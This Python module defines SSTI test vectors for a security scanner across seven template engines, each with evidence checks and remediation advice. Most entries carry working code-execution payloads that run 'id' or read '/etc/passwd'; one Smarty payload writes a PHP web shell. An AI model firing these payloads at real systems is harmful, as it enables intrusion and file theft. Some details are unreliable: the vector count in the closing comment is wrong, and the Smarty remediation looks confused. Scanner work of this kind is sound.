"""
Server-Side Template Injection (SSTI) Testing Vectors
Jinja2/Flask, Twig, FreeMarker, and other template engines
"""

from ..models import (
    TestVector, VulnerabilityType, TestVectorPosition as Position, PositionType,
    TestVectorPayload as PayloadTemplate, TestVectorEvidence as Evidence, 
    ConfidenceLevel, SensitivityLevel
)

SSTI_TEST_VECTORS = [
    # ============================================================================
    # JINJA2 / FLASK TEMPLATE INJECTION
    # ============================================================================
    
    TestVector(
        id="ssti-jinja2-001",
        name="Jinja2 Basic Expression Injection",
        description="Tests for basic Jinja2 template expression evaluation",
        vuln_type=VulnerabilityType.SSTI_JINJA2,
        position=Position(
            type=PositionType.QUERY,
            name="name",
            value_prefix="",
            value_suffix=""
        ),
        payload=PayloadTemplate(
            base="{{7*7}}",
            variants=[
                "{{7*7}}",
                "{{7*'7'}}",
                "{{config}}",
                "{{self}}",
                "${7*7}",
                "#{7*7}"
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=[
                "Output contains '49'",
                "Template expression evaluated",
                "Mathematical operation executed"
            ],
            false_positive_indicators=[
                "Literal string '{{7*7}}' in output",
                "Template not processed"
            ],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Use safe template rendering. Never pass user input directly to template engine.",
        references=[
            "https://portswigger.net/web-security/server-side-template-injection",
            "https://cwe.mitre.org/data/definitions/1336.html"
        ],
        tags=["ssti", "jinja2", "flask", "expression-injection"]
    ),
    
    TestVector(
        id="ssti-jinja2-002",
        name="Jinja2 Config Object Access",
        description="Tests if Jinja2 config object exposes sensitive application data",
        vuln_type=VulnerabilityType.SSTI_JINJA2,
        position=Position(
            type=PositionType.BODY_JSON,
            name="template",
            value_prefix="",
            value_suffix=""
        ),
        payload=PayloadTemplate(
            base="{{config.items()}}",
            variants=[
                "{{config.items()}}",
                "{{config.SECRET_KEY}}",
                "{{config.DATABASE_URI}}",
                "{{config}}",
                "{{self._TemplateReference__context.config}}"
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=[
                "Config items displayed",
                "SECRET_KEY exposed",
                "Sensitive configuration leaked"
            ],
            false_positive_indicators=[
                "Config access blocked",
                "Literal string in output"
            ],
            confidence=ConfidenceLevel.CRITICAL
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Disable config access in templates. Use sandboxed template environment.",
        references=[
            "https://portswigger.net/research/server-side-template-injection",
            "https://cwe.mitre.org/data/definitions/94.html"
        ],
        tags=["ssti", "jinja2", "config-leak", "information-disclosure"]
    ),
    
    TestVector(
        id="ssti-jinja2-003",
        name="Jinja2 RCE via __subclasses__",
        description="Tests for RCE via Python object introspection in Jinja2",
        vuln_type=VulnerabilityType.SSTI_JINJA2,
        position=Position(
            type=PositionType.QUERY,
            name="q",
            value_prefix="",
            value_suffix=""
        ),
        payload=PayloadTemplate(
            base="{{''.__class__.__mro__[1].__subclasses__()}}",
            variants=[
                "{{''.__class__.__mro__[1].__subclasses__()}}",
                "{{request.__class__.__mro__[1].__subclasses__()}}",
                "{{lipsum.__globals__['os'].popen('id').read()}}",
                "{{cycler.__init__.__globals__.os.popen('id').read()}}",
                "{{joiner.__init__.__globals__.os.popen('id').read()}}"
            ],
            encoding="url"
        ),
        expected_evidence=Evidence(
            indicators=[
                "Command execution output",
                "Object introspection successful",
                "RCE achieved"
            ],
            false_positive_indicators=[
                "Sandboxed environment blocks access",
                "Error message"
            ],
            confidence=ConfidenceLevel.CRITICAL
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Use Jinja2 SandboxedEnvironment. Block dangerous attributes. Input validation.",
        references=[
            "https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti",
            "https://cwe.mitre.org/data/definitions/94.html"
        ],
        tags=["ssti", "jinja2", "rce", "code-execution"]
    ),
    
    TestVector(
        id="ssti-jinja2-004",
        name="Jinja2 File Read via __import__",
        description="Tests for file read via __import__ in Jinja2 templates",
        vuln_type=VulnerabilityType.SSTI_JINJA2,
        position=Position(
            type=PositionType.BODY_JSON,
            name="message",
            value_prefix="",
            value_suffix=""
        ),
        payload=PayloadTemplate(
            base="{{__import__('os').popen('cat /etc/passwd').read()}}",
            variants=[
                "{{__import__('os').popen('cat /etc/passwd').read()}}",
                "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
                "{{config.__class__.__init__.__globals__['os'].listdir('.')}}"
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=[
                "File contents displayed",
                "/etc/passwd content leaked",
                "File read successful"
            ],
            false_positive_indicators=[
                "Access denied",
                "Sandboxing prevents execution"
            ],
            confidence=ConfidenceLevel.CRITICAL
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Sandbox template execution. Block __import__, os module access.",
        references=[
            "https://cwe.mitre.org/data/definitions/73.html"
        ],
        tags=["ssti", "jinja2", "file-read", "lfi"]
    ),
    
    # ============================================================================
    # TWIG (PHP) TEMPLATE INJECTION
    # ============================================================================
    
    TestVector(
        id="ssti-twig-001",
        name="Twig Basic Expression Injection",
        description="Tests for basic Twig template expression evaluation",
        vuln_type=VulnerabilityType.SSTI_TWIG,
        position=Position(
            type=PositionType.QUERY,
            name="name",
            value_prefix="",
            value_suffix=""
        ),
        payload=PayloadTemplate(
            base="{{7*7}}",
            variants=[
                "{{7*7}}",
                "{{7*'7'}}",
                "{{_self}}",
                "{{dump(app)}}"
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=[
                "Output contains '49' or '7777777'",
                "Template expression evaluated",
                "Twig processing confirmed"
            ],
            false_positive_indicators=[
                "Literal '{{7*7}}' in output",
                "No evaluation"
            ],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Use Twig sandbox. Validate and sanitize user input before template rendering.",
        references=[
            "https://portswigger.net/research/server-side-template-injection",
            "https://cwe.mitre.org/data/definitions/1336.html"
        ],
        tags=["ssti", "twig", "php", "expression-injection"]
    ),
    
    TestVector(
        id="ssti-twig-002",
        name="Twig RCE via getFilter",
        description="Tests for RCE via Twig filter manipulation",
        vuln_type=VulnerabilityType.SSTI_TWIG,
        position=Position(
            type=PositionType.BODY_JSON,
            name="template",
            value_prefix="",
            value_suffix=""
        ),
        payload=PayloadTemplate(
            base="{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}",
            variants=[
                "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}",
                "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('whoami')}}",
                "{{['id']|filter('system')}}"
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=[
                "Command execution output",
                "System function registered as filter",
                "RCE achieved"
            ],
            false_positive_indicators=[
                "Sandbox prevents execution",
                "Filter registration blocked"
            ],
            confidence=ConfidenceLevel.CRITICAL
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Enable Twig sandbox. Disable dangerous functions and filters.",
        references=[
            "https://cwe.mitre.org/data/definitions/94.html"
        ],
        tags=["ssti", "twig", "rce", "filter-abuse"]
    ),
    
    # ============================================================================
    # FREEMARKER (JAVA) TEMPLATE INJECTION
    # ============================================================================
    
    TestVector(
        id="ssti-freemarker-001",
        name="FreeMarker Basic Expression Injection",
        description="Tests for basic FreeMarker template expression evaluation",
        vuln_type=VulnerabilityType.SSTI_FREEMARKER,
        position=Position(
            type=PositionType.QUERY,
            name="template",
            value_prefix="",
            value_suffix=""
        ),
        payload=PayloadTemplate(
            base="${7*7}",
            variants=[
                "${7*7}",
                "#{7*7}",
                "${7*'7'}",
                "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}"
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=[
                "Output contains '49'",
                "Expression evaluated",
                "FreeMarker processing detected"
            ],
            false_positive_indicators=[
                "Literal '${7*7}' in output",
                "No evaluation"
            ],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Use FreeMarker Configuration with restricted object access. Sandbox templates.",
        references=[
            "https://portswigger.net/research/server-side-template-injection",
            "https://cwe.mitre.org/data/definitions/1336.html"
        ],
        tags=["ssti", "freemarker", "java", "expression-injection"]
    ),
    
    TestVector(
        id="ssti-freemarker-002",
        name="FreeMarker RCE via Execute Class",
        description="Tests for RCE via FreeMarker Execute utility class",
        vuln_type=VulnerabilityType.SSTI_FREEMARKER,
        position=Position(
            type=PositionType.BODY_JSON,
            name="content",
            value_prefix="",
            value_suffix=""
        ),
        payload=PayloadTemplate(
            base="<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
            variants=[
                "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
                "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('whoami')}",
                "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('cat /etc/passwd')}",
                "<#assign classloader=object?api.class.getClassLoader()>${classloader.loadClass('java.lang.Runtime').getRuntime().exec('id')}"
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=[
                "Command execution output",
                "System command executed",
                "RCE confirmed"
            ],
            false_positive_indicators=[
                "Execute class blocked",
                "Sandbox prevents execution"
            ],
            confidence=ConfidenceLevel.CRITICAL
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Configure FreeMarker to disallow Execute class. Use new_builtin_class_resolver=safer.",
        references=[
            "https://ackcent.com/blog/in-line-freemarker-template-injection-exploitation/",
            "https://cwe.mitre.org/data/definitions/94.html"
        ],
        tags=["ssti", "freemarker", "rce", "execute-class"]
    ),
    
    # ============================================================================
    # VELOCITY (JAVA) TEMPLATE INJECTION
    # ============================================================================
    
    TestVector(
        id="ssti-velocity-001",
        name="Velocity Template Injection",
        description="Tests for Apache Velocity template injection",
        vuln_type=VulnerabilityType.SSTI,
        position=Position(
            type=PositionType.QUERY,
            name="template",
            value_prefix="",
            value_suffix=""
        ),
        payload=PayloadTemplate(
            base="#set($x=7*7)$x",
            variants=[
                "#set($x=7*7)$x",
                "#set($s='')$s.class.forName('java.lang.Runtime').getRuntime().exec('id')",
                "$class.inspect('java.lang.Runtime').type.getRuntime().exec('whoami').waitFor()"
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=[
                "Output contains '49'",
                "Velocity directive executed",
                "Command execution"
            ],
            false_positive_indicators=[
                "Literal directive in output",
                "No evaluation"
            ],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Use Velocity SecureUberspector. Restrict class access in templates.",
        references=[
            "https://cwe.mitre.org/data/definitions/94.html"
        ],
        tags=["ssti", "velocity", "java", "template-injection"]
    ),
    
    # ============================================================================
    # SMARTY (PHP) TEMPLATE INJECTION
    # ============================================================================
    
    TestVector(
        id="ssti-smarty-001",
        name="Smarty Template Injection",
        description="Tests for Smarty (PHP) template injection",
        vuln_type=VulnerabilityType.SSTI,
        position=Position(
            type=PositionType.QUERY,
            name="name",
            value_prefix="",
            value_suffix=""
        ),
        payload=PayloadTemplate(
            base="{7*7}",
            variants=[
                "{7*7}",
                "{php}echo `id`;{/php}",
                "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,'<?php eval($_GET[1]); ?>',self::clearConfig())}",
                "{system('id')}"
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=[
                "Output contains '49'",
                "Smarty expression evaluated",
                "PHP code execution"
            ],
            false_positive_indicators=[
                "Literal '{7*7}' in output",
                "PHP tag disabled"
            ],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Disable {php} tags in Smarty. Use $smarty->disableSecurity = false.",
        references=[
            "https://cwe.mitre.org/data/definitions/94.html"
        ],
        tags=["ssti", "smarty", "php", "template-injection"]
    ),
    
    # ============================================================================
    # EJS (NODE.JS) TEMPLATE INJECTION
    # ============================================================================
    
    TestVector(
        id="ssti-ejs-001",
        name="EJS Template Injection",
        description="Tests for EJS (Node.js) template injection",
        vuln_type=VulnerabilityType.SSTI,
        position=Position(
            type=PositionType.QUERY,
            name="name",
            value_prefix="",
            value_suffix=""
        ),
        payload=PayloadTemplate(
            base="<%= 7*7 %>",
            variants=[
                "<%= 7*7 %>",
                "<%= global.process.mainModule.require('child_process').execSync('id') %>",
                "<%= global.process.mainModule.constructor._load('child_process').execSync('whoami') %>"
            ],
            encoding="url"
        ),
        expected_evidence=Evidence(
            indicators=[
                "Output contains '49'",
                "Command execution output",
                "EJS evaluation confirmed"
            ],
            false_positive_indicators=[
                "Literal '<%= 7*7 %>' in output",
                "No evaluation"
            ],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Never render user input as EJS template. Use parameterized rendering.",
        references=[
            "https://eslam.io/posts/ejs-server-side-template-injection-rce/",
            "https://cwe.mitre.org/data/definitions/94.html"
        ],
        tags=["ssti", "ejs", "nodejs", "rce"]
    ),
    
    # ============================================================================
    # HANDLEBARS TEMPLATE INJECTION
    # ============================================================================
    
    TestVector(
        id="ssti-handlebars-001",
        name="Handlebars Template Injection",
        description="Tests for Handlebars template injection",
        vuln_type=VulnerabilityType.SSTI,
        position=Position(
            type=PositionType.QUERY,
            name="template",
            value_prefix="",
            value_suffix=""
        ),
        payload=PayloadTemplate(
            base="{{#with 'constructor'}}{{#with ../constructor}}{{#with split}}{{#with (lookup . 'constructor')}}{{#with (lookup . 'prototype')}}{{#with (lookup . 'call')}}{{this}}{{/with}}{{/with}}{{/with}}{{/with}}{{/with}}{{/with}}",
            variants=[
                "{{7*7}}",
                "{{this}}",
                "{{constructor.constructor('return process')().mainModule.require('child_process').execSync('id')}}"
            ],
            encoding="url"
        ),
        expected_evidence=Evidence(
            indicators=[
                "Template evaluated",
                "Prototype chain traversal",
                "Code execution"
            ],
            false_positive_indicators=[
                "Sandboxed environment",
                "Prototype access blocked"
            ],
            confidence=ConfidenceLevel.MEDIUM
        ),
        sensitivity=SensitivityLevel.HIGH,
        remediation="Use Handlebars precompiled templates. Enable strict mode.",
        references=[
            "https://cwe.mitre.org/data/definitions/94.html"
        ],
        tags=["ssti", "handlebars", "nodejs", "prototype-pollution"]
    ),
    
    # ============================================================================
    # BLIND SSTI DETECTION
    # ============================================================================
    
    TestVector(
        id="ssti-blind-001",
        name="Blind SSTI Detection via Time-Based Delay",
        description="Tests for blind SSTI using time-based payloads",
        vuln_type=VulnerabilityType.SSTI,
        position=Position(
            type=PositionType.QUERY,
            name="input",
            value_prefix="",
            value_suffix=""
        ),
        payload=PayloadTemplate(
            base="{{''.__class__.__mro__[1].__subclasses__()[186].__init__.__globals__['time'].sleep(10)}}",
            variants=[
                # Jinja2
                "{{''.__class__.__mro__[1].__subclasses__()[186].__init__.__globals__['time'].sleep(10)}}",
                # Twig
                "{{1*sleep(10)}}",
                # FreeMarker
                "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('sleep 10')}",
                # Generic
                "${@java.lang.Thread@sleep(10000)}"
            ],
            encoding="url"
        ),
        expected_evidence=Evidence(
            indicators=[
                "Response delayed by ~10 seconds",
                "Time-based SSTI confirmed",
                "Template engine processing user input"
            ],
            false_positive_indicators=[
                "No delay observed",
                "Normal response time"
            ],
            confidence=ConfidenceLevel.MEDIUM
        ),
        sensitivity=SensitivityLevel.HIGH,
        remediation="Implement input validation. Use safe template rendering practices.",
        references=[
            "https://cwe.mitre.org/data/definitions/1336.html"
        ],
        tags=["ssti", "blind", "time-based", "detection"]
    ),
]

# Total vectors: 15
